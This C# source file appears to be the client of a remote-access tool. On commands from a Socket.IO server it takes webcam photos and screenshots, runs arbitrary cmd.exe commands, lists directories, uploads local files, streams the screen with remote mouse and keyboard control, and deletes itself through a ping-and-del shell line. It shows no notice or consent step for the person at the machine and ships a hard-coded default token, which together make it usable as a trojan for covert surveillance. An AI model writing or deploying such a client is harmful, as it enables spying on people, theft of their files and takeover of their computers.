using System;
using System.IO;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Threading;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;
using System.Text.Json;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using SocketIOClient;
using OpenCvSharp;
using System.Text;
using System.Linq;

// 解决命名空间冲突
using SocketIOClientSocket = SocketIOClient.SocketIO;
using Point = System.Drawing.Point;
using Size = System.Drawing.Size;
namespace RemoteCore
{
    public class RemoteClient
    {
        private readonly SocketIOClientSocket _socket;
        private readonly HttpClient _httpClient;
        private readonly string _serverUrl = Environment.GetEnvironmentVariable("REMOTECORE_SERVER_URL") ?? "http://127.0.0.1:5000";
        private readonly string _authToken = Environment.GetEnvironmentVariable("REMOTECORE_AUTH_TOKEN") ?? "admin123";
        private bool _isRunning = false;
        private bool _vncActive = false;
        private bool _cameraInitialized = false;

        // P/Invoke for VNC input simulation
        [DllImport("user32.dll")]
        static extern bool SetCursorPos(int X, int Y);


        [DllImport("user32.dll")]
        static extern void mouse_event(uint dwFlags, int dx, int dy, uint dwData, int dwExtraInfo);

        [DllImport("user32.dll")]
        static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, int dwExtraInfo);

        const uint MOUSEEVENTF_LEFTDOWN = 0x0002;
        const uint MOUSEEVENTF_LEFTUP = 0x0004;
        const uint MOUSEEVENTF_RIGHTDOWN = 0x0008;
        const uint MOUSEEVENTF_RIGHTUP = 0x0010;
        const uint MOUSEEVENTF_MIDDLEDOWN = 0x0020;
        const uint MOUSEEVENTF_MIDDLEUP = 0x0040;
        const uint KEYEVENTF_KEYUP = 0x0002;

        // 硬编码配置常量
        private const int ConnectTimeout = 30;
        private const int ReconnectInterval = 10;
        private const int CommandTimeout = 30;
        private const int VncFps = 10;
        private const int VncQuality = 40;
        private static readonly System.Drawing.Size VncResolution = new System.Drawing.Size(1280, 720);

        public RemoteClient()
        {
            _httpClient = new HttpClient();
            _httpClient.Timeout = TimeSpan.FromSeconds(ConnectTimeout);
            _httpClient.DefaultRequestHeaders.Add("User-Agent", "RemoteClient");
            _httpClient.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", _authToken);

            _socket = new SocketIOClientSocket(_serverUrl, new SocketIOOptions
            {
                Transport = SocketIOClient.Transport.TransportProtocol.WebSocket,
                ExtraHeaders = new Dictionary<string, string> 
                {
                    { "User-Agent", "RemoteClient" },
                    { "Authorization", $"Bearer {_authToken}" }
                }
            });

            RegisterEvents();
        }

        private void RegisterEvents()
        {
            _socket.OnConnected += (sender, e) => Console.WriteLine("Connected to server");
            _socket.OnDisconnected += (sender, e) => Console.WriteLine("Disconnected from server");

            _socket.On("shoot", async response => await TakePhotoAsync());
            
            _socket.On("take_screenshot", async response => await TakeScreenshotAsync());
            
            _socket.On("execute_command", async response => 
            {
                var data = response.GetValue<JsonElement>();
                if (data.TryGetProperty("command", out var cmdProp))
                {
                    await ExecuteCommandAsync(cmdProp.GetString());
                }
            });

            _socket.On("list_dir", async response => 
            {
                var data = response.GetValue<JsonElement>();
                if (data.TryGetProperty("path", out var pathProp))
                {
                    await ListDirAsync(pathProp.GetString());
                }
            });

            _socket.On("upload_file_to_server", async response => 
            {
                var data = response.GetValue<JsonElement>();
                string path = data.GetProperty("path").GetString() ?? "";
                string filename = data.GetProperty("filename").GetString() ?? "";
                await UploadFileToServerAsync(path, filename);
            });

            _socket.On("download_file", async response => 
            {
                var data = response.GetValue<JsonElement>();
                string url = data.GetProperty("url").GetString() ?? "";
                string targetDir = data.GetProperty("target_dir").GetString() ?? "";
                string filename = data.GetProperty("filename").GetString() ?? "";
                await DownloadFileFromServerAsync(url, targetDir, filename);
            });

            _socket.On("start_vnc", response =>
            {
                _ = VncLoopAsync();
            });

            _socket.On("stop_vnc", response =>
            {
                _vncActive = false;
            });

            _socket.On("vnc_mouse_event", response =>
            {
                var data = response.GetValue<JsonElement>();
                HandleVncMouse(data);
            });

            _socket.On("vnc_key_event", response =>
            {
                var data = response.GetValue<JsonElement>();
                HandleVncKey(data);
            });

            _socket.On("client_control", response =>
            {
                var data = response.GetValue<JsonElement>();
                string action = data.GetProperty("action").GetString() ?? "";
                HandleClientControl(action);
            });
        }

        private bool InitializeCamera()
        {
            Console.WriteLine("Initializing camera...");
            try
            {
                // 尝试初始化摄像头
                using var capture = new VideoCapture(0, VideoCaptureAPIs.ANY);
                if (capture.IsOpened())
                {
                    capture.Set(VideoCaptureProperties.FrameWidth, 1280);
                    capture.Set(VideoCaptureProperties.FrameHeight, 720);
                    capture.Set(VideoCaptureProperties.Fps, 30);
                    
                    using var image = new Mat();
                    bool ret = capture.Read(image);
                    if (ret && !image.Empty())
                    {
                        Console.WriteLine("Camera initialized successfully");
                        _cameraInitialized = true;
                        return true;
                    }
                }
                Console.WriteLine("Failed to initialize camera");
                _cameraInitialized = false;
                return false;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error initializing camera: {ex.Message}");
                _cameraInitialized = false;
                return false;
            }
        }

        private async Task KeepAliveAsync()
        {
            while (_isRunning)
            {
                try
                {
                    // 检查摄像头状态
                    if (!_cameraInitialized)
                    {
                        Console.WriteLine("Camera not initialized, trying to initialize...");
                        InitializeCamera();
                    }
                    
                    // 检查服务器连接
                    if (!_socket.Connected)
                    {
                        Console.WriteLine("Server disconnected, reconnecting...");
                        // 连接会在主循环中处理
                    }
                    
                    await Task.Delay(30000); // 每30秒检查一次
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error in keep alive: {ex.Message}");
                    await Task.Delay(30000);
                }
            }
        }

        public async Task StartAsync()
        {
            _isRunning = true;
            
            // 初始化摄像头
            InitializeCamera();
            
            // 启动保活线程
            _ = KeepAliveAsync();
            
            try
            {
                Console.WriteLine("Attempting to connect to server...");
                await _socket.ConnectAsync();
                Console.WriteLine("Connected to server successfully");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Connection error: {ex.Message}");
            }
            
            while (_isRunning)
            {
                await Task.Delay(1000);
            }
        }

        private async Task TakePhotoAsync()
        {
            try
            {
                // 确保摄像头已初始化
                if (!_cameraInitialized)
                {
                    Console.WriteLine("Camera not initialized, trying to initialize...");
                    // 尝试初始化摄像头
                    if (!InitializeCamera())
                    {
                        Console.WriteLine("Failed to initialize camera");
                        return;
                    }
                }
                
                // 拍摄照片
                using var capture = new VideoCapture(0, VideoCaptureAPIs.ANY);
                if (capture.IsOpened())
                {
                    // 拍摄前短暂等待，确保摄像头准备就绪
                    await Task.Delay(500);
                    
                    // 连续读取3次，取最后一次结果以确保画面清晰
                    Mat image = null!;
                    try
                    {
                        for (int i = 0; i < 3; i++)
                        {
                            using var tempImage = new Mat();
                            if (capture.Read(tempImage) && !tempImage.Empty())
                            {
                                if (image != null)
                                {
                                    image.Dispose();
                                }
                                image = tempImage.Clone();
                            }
                            await Task.Delay(100);
                        }
                        
                        if (image != null && !image.Empty())
                        {
                            byte[] imageBytes = image.ToBytes(".jpg");
                            await UploadPhotoAsync(imageBytes);
                            Console.WriteLine("Photo taken and uploaded successfully");
                        }
                        else
                        {
                            Console.WriteLine("Failed to capture photo");
                            // 尝试重新初始化摄像头
                            _cameraInitialized = false;
                        }
                    }
                    finally
                    {
                        if (image != null)
                        {
                            image.Dispose();
                        }
                    }
                }
                else
                {
                    Console.WriteLine("Failed to open camera");
                    _cameraInitialized = false;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Camera error: {ex.Message}");
                // 异常发生后重新初始化摄像头
                _cameraInitialized = false;
            }
        }

        private async Task TakeScreenshotAsync()
        {
            try
            {
                // 捕获所有显示器
                Rectangle bounds = Rectangle.Empty;
                foreach (Screen screen in Screen.AllScreens)
                {
                    bounds = Rectangle.Union(bounds, screen.Bounds);
                }
                
                using Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height);
                using (Graphics g = Graphics.FromImage(bitmap))
                {
                    g.CopyFromScreen(bounds.Location, Point.Empty, bounds.Size);
                }
                using MemoryStream ms = new MemoryStream();
                bitmap.Save(ms, ImageFormat.Jpeg);
                await UploadPhotoAsync(ms.ToArray());
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Screenshot error: {ex.Message}");
            }
        }

        private async Task UploadPhotoAsync(byte[] imageBytes)
        {
            try
            {
                using var content = new MultipartFormDataContent();
                var imageContent = new ByteArrayContent(imageBytes);
                imageContent.Headers.ContentType = MediaTypeHeaderValue.Parse("image/jpeg");
                content.Add(imageContent, "photo", "photo.jpg");

                var response = await _httpClient.PostAsync($"{_serverUrl}/upload", content);
                response.EnsureSuccessStatusCode();
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Upload error: {ex.Message}");
            }
        }

        private async Task ExecuteCommandAsync(string? command)
        {
            if (string.IsNullOrWhiteSpace(command)) return;

            Console.WriteLine($"Received command: {command}");

            string output = "";
            string error = "";

            try
            {
                string cmdStrip = command.Trim();
                if (cmdStrip.StartsWith("cd ", StringComparison.OrdinalIgnoreCase))
                {
                    output = "Warning: Global directory change via 'cd' is disabled to prevent race conditions. Please use absolute paths in commands.";
                }
                else if (cmdStrip.Length == 2 && cmdStrip[1] == ':')
                {
                    output = "Warning: Global drive change is disabled to prevent race conditions.";
                }
                else
                {
                    // 检查是否具有管理员权限
                    if (!IsAdmin())
                    {
                        Console.WriteLine("Command execution requires admin privileges, but not running as admin");
                        error = "Error: Administrator privileges required for this command.";
                        output = "";
                    }
                    else
                    {
                        // 执行命令（不再限制危险命令）
                        using var process = new Process
                        {
                            StartInfo = new ProcessStartInfo
                            {
                                FileName = "cmd.exe",
                                Arguments = $"/c {command}",
                                RedirectStandardOutput = true,
                                RedirectStandardError = true,
                                UseShellExecute = false,
                                CreateNoWindow = true
                            }
                        };
                        process.Start();
                        
                        var outputTask = process.StandardOutput.ReadToEndAsync();
                        var errorTask = process.StandardError.ReadToEndAsync();
                        
                        int timeoutMs = CommandTimeout * 1000;
                        using var cts = new CancellationTokenSource(timeoutMs);
                        try
                        {
                            await Task.WhenAny(Task.WhenAll(outputTask, errorTask), Task.Delay(timeoutMs, cts.Token));
                            if (!process.HasExited)
                            {
                                process.Kill();
                                error = $"Command execution timed out ({CommandTimeout}s)";
                            }
                            else
                            {
                                output = await outputTask;
                                error = await errorTask;
                            }
                            cts.Cancel(); // 确保正常退出时释放超时 Task
                        }
                        catch (Exception ex)
                        {
                            error = ex.Message;
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error executing command: {ex.Message}");
                error = ex.Message;
            }

            await _socket.EmitAsync("command_result", new { command = command, output = output, error = error });
        }

        private bool IsAdmin()
        {
            try
            {
                var identity = System.Security.Principal.WindowsIdentity.GetCurrent();
                var principal = new System.Security.Principal.WindowsPrincipal(identity);
                return principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
            }
            catch
            {
                return false;
            }
        }

        private async Task ListDirAsync(string? path)
        {
            try
            {
                if (string.IsNullOrWhiteSpace(path)) path = Directory.GetCurrentDirectory();

                if (!Directory.Exists(path))
                {
                    await _socket.EmitAsync("dir_list_result", new { error = "Path does not exist", path = path });
                    return;
                }

                var files = new List<object>();
                var dirInfo = new DirectoryInfo(path);
                
                foreach (var dir in dirInfo.GetDirectories())
                {
                    files.Add(new { name = dir.Name, is_dir = true, size = 0, mtime = new DateTimeOffset(dir.LastWriteTime).ToUnixTimeSeconds() });
                }
                foreach (var file in dirInfo.GetFiles())
                {
                    files.Add(new { name = file.Name, is_dir = false, size = file.Length, mtime = new DateTimeOffset(file.LastWriteTime).ToUnixTimeSeconds() });
                }

                await _socket.EmitAsync("dir_list_result", new { path = path, files = files });
            }
            catch (Exception ex)
            {
                await _socket.EmitAsync("dir_list_result", new { error = ex.Message, path = path });
            }
        }

        private async Task UploadFileToServerAsync(string path, string filename)
        {
            try
            {
                if (!File.Exists(path))
                {
                    await _socket.EmitAsync("client_upload_error", new { error = "File not found: " + path });
                    return;
                }

                using var content = new MultipartFormDataContent();
                using var fileStream = File.OpenRead(path);
                var streamContent = new StreamContent(fileStream);
                content.Add(streamContent, "file", filename);
                content.Add(new StringContent(filename), "filename");

                var response = await _httpClient.PostAsync($"{_serverUrl}/client_upload_file", content);
                response.EnsureSuccessStatusCode();
            }
            catch (Exception ex)
            {
                await _socket.EmitAsync("client_upload_error", new { error = ex.Message });
            }
        }

        private async Task DownloadFileFromServerAsync(string url, string targetDir, string filename)
        {
            try
            {
                // Prevent path traversal and absolute path injection
                string safeFilename = Path.GetFileName(filename);
                if (string.IsNullOrEmpty(safeFilename))
                    throw new ArgumentException("Invalid filename");

                string fullTargetDir = Path.GetFullPath(targetDir);
                string targetPath = Path.GetFullPath(Path.Combine(fullTargetDir, safeFilename));

                if (!targetPath.StartsWith(fullTargetDir, StringComparison.OrdinalIgnoreCase))
                    throw new UnauthorizedAccessException("Path traversal detected");

                if (!Directory.Exists(fullTargetDir)) Directory.CreateDirectory(fullTargetDir);
                var response = await _httpClient.GetAsync(url);
                response.EnsureSuccessStatusCode();

                using var fs = new FileStream(targetPath, FileMode.Create, FileAccess.Write, FileShare.None);
                await response.Content.CopyToAsync(fs);

                await _socket.EmitAsync("client_download_complete", new { success = true, path = targetPath });
            }
            catch (Exception ex)
            {
                await _socket.EmitAsync("client_download_complete", new { error = ex.Message });
            }
        }

        private async Task VncLoopAsync()
        {
            if (_vncActive) return; // Prevent multiple loops
            _vncActive = true;
            Console.WriteLine("VNC Loop started");
            
            // 提取出循环外以减少分配和提高性能
            var encoder = ImageCodecInfo.GetImageEncoders().FirstOrDefault(c => c.FormatID == ImageFormat.Jpeg.Guid);
            using var encoderParams = new EncoderParameters(1);
            encoderParams.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, (long)VncQuality); // 使用配置的质量

            while (_vncActive && _isRunning)
            {
                try
                {
                    // 捕获所有显示器
                    Rectangle bounds = Rectangle.Empty;
                    foreach (Screen screen in Screen.AllScreens)
                    {
                        bounds = Rectangle.Union(bounds, screen.Bounds);
                    }
                    
                    using Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height);
                    using (Graphics g = Graphics.FromImage(bitmap))
                    {
                        g.CopyFromScreen(bounds.Location, Point.Empty, bounds.Size);
                    }

                    // Resize to configured resolution to save bandwidth
                    using Bitmap resized = new Bitmap(bitmap, VncResolution);
                    using MemoryStream ms = new MemoryStream();
                    
                    if (encoder != null)
                    {
                        resized.Save(ms, encoder, encoderParams);
                    }
                    else
                    {
                        resized.Save(ms, ImageFormat.Jpeg);
                    }
                    
                    string base64 = Convert.ToBase64String(ms.ToArray());
                    await _socket.EmitAsync("vnc_frame", new { image = base64 });
                    
                    await Task.Delay(1000 / VncFps); // 使用配置的帧率
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"VNC loop error: {ex.Message}");
                    await Task.Delay(1000);
                }
            }
            Console.WriteLine("VNC Loop stopped");
        }

        private void HandleVncMouse(JsonElement data)
        {
            try
            {
                if (!data.TryGetProperty("action", out var actionProp) || 
                    !data.TryGetProperty("button", out var buttonProp) ||
                    !data.TryGetProperty("x", out var xProp) ||
                    !data.TryGetProperty("y", out var yProp))
                    return;

                string action = actionProp.GetString() ?? "";
                int button = buttonProp.GetInt32();
                double xRel = xProp.GetDouble();
                double yRel = yProp.GetDouble();

                int screenWidth = Screen.PrimaryScreen!.Bounds.Width;
                int screenHeight = Screen.PrimaryScreen!.Bounds.Height;

                int x = (int)(xRel * screenWidth);
                int y = (int)(yRel * screenHeight);

                SetCursorPos(x, y);

                if (action == "down")
                {
                    uint flag = button switch { 0 => MOUSEEVENTF_LEFTDOWN, 1 => MOUSEEVENTF_MIDDLEDOWN, 2 => MOUSEEVENTF_RIGHTDOWN, _ => 0 };
                    if (flag != 0) mouse_event(flag, x, y, 0, 0);
                }
                else if (action == "up")
                {
                    uint flag = button switch { 0 => MOUSEEVENTF_LEFTUP, 1 => MOUSEEVENTF_MIDDLEUP, 2 => MOUSEEVENTF_RIGHTUP, _ => 0 };
                    if (flag != 0) mouse_event(flag, x, y, 0, 0);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"HandleVncMouse error: {ex.Message}");
            }
        }

        private void HandleVncKey(JsonElement data)
        {
            try
            {
                if (!data.TryGetProperty("action", out var actionProp) || 
                    !data.TryGetProperty("keyCode", out var keyCodeProp))
                    return;

                string action = actionProp.GetString() ?? "";
                byte keyCode = keyCodeProp.GetByte();

                if (action == "down")
                {
                    keybd_event(keyCode, 0, 0, 0);
                }
                else if (action == "up")
                {
                    keybd_event(keyCode, 0, KEYEVENTF_KEYUP, 0);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"HandleVncKey error: {ex.Message}");
            }
        }

        private void HandleClientControl(string action)
        {
            try
            {
                if (action == "stop")
                {
                    Console.WriteLine("Stopping client by remote command...");
                    Environment.Exit(0);
                }
                else if (action == "restart")
                {
                    Console.WriteLine("Restarting client by remote command...");
                    Process.Start(Environment.ProcessPath!);
                    Environment.Exit(0);
                }
                else if (action == "uninstall")
                {
                    Console.WriteLine("Uninstalling client by remote command...");
                    Program.SetAutoStart(false);
                    
                    // Release the mutex to allow file deletion
                    Program.ReleaseMutex();
                    
                    string path = Environment.ProcessPath!;
                    Process.Start(new ProcessStartInfo
                    {
                        FileName = "cmd.exe",
                        Arguments = $"/c ping 127.0.0.1 -n 3 > nul & del /f /q \"{path}\"",
                        CreateNoWindow = true,
                        UseShellExecute = false
                    });
                    Environment.Exit(0);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"HandleClientControl error: {ex.Message}");
            }
        }
    }
}
